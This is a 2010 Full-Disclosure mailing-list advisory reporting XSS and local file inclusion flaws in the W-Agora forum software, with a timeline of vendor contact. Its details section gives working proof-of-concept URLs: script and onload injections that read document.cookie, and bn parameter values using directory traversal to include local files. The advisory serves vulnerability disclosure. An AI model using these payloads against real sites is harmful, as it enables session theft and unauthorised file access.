Hello Full-Disclosure!

I want to warn you about new Cross-Site Scripting and Local File Inclusion
vulnerabilities in W-Agora.

-------------------------
Affected products:
-------------------------

Vulnerable are W-Agora 4.2.1 and previous versions.

----------
Details:
----------

XSS (WASC-08):

http://site/news/for-print.php3?bn=x&key=1282850719%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/news/for-print.php3?bn=%3Cbody%20onload=alert(document.cookie)%3E

http://site/news/login.php3?bn=x&loginform=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

Vulnerability works in version 4.1.5, but doesn't work in 4.2.1.

http://site/news/login.php3?bn=%3Cbody%20onload=alert(document.cookie)%3E

Local File Inclusion (WASC-31):

It's possible to include php-files (with extension php3 in version W-Agora
4.1.5 or with extension php in version 4.2.1).

In folder conf:

http://site/news/for-print.php3?bn=1

http://site/news/login.php3?bn=1

In any folder (only on Windows-servers):

http://site/news/for-print.php3?bn=..\1

http://site/news/login.php3?bn=..\1

In last versions of the system php3 scripts has php extension.

------------
Timeline:
------------

2010.08.29 - announced at my site.
2010.08.30 - informed developers. Developers of W-Agora didn't answer and
didn't fix the holes (like previous time). But after publication of previous
holes in bugtracks, it looks like developers begun to fix them, at least
fixed mentioned XSS at official site of the system.
2010.10.27 - disclosed at my site.

I mentioned about these vulnerabilities at my site
(http://websecurity.com.ua/4484/).

Best wishes & regards,
MustLive
Administrator of Websecurity web site
http://websecurity.com.ua 


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
